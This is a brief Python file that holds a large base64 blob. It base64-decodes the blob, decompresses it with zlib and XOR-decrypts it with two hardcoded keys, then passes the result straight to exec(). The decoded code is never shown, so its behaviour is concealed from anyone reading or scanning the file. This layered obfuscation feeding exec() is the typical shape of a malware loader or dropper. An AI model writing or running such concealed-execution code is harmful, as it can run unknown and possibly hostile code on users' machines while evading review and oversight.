# -*- coding: utf-8 -*-
import zlib,base64

def _x(d,k):
 o=bytearray()
 for i,b in enumerate(d):
  o.append(b^k[i%len(k)])
 return bytes(o)

_keys=[[229, 223, 140, 7, 116, 106, 12, 198, 195, 91, 55, 7, 186, 215, 111, 220], [249, 50, 178, 18, 158, 88, 91, 119, 232, 159, 162, 199, 39, 43, 240, 186]]
_d=(
    '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'
)

for k in reversed(_keys):
 _d=base64.b64decode(_d)
 _d=zlib.decompress(_d)
 _d=_x(_d,k)

exec(_d.decode('utf-8'))
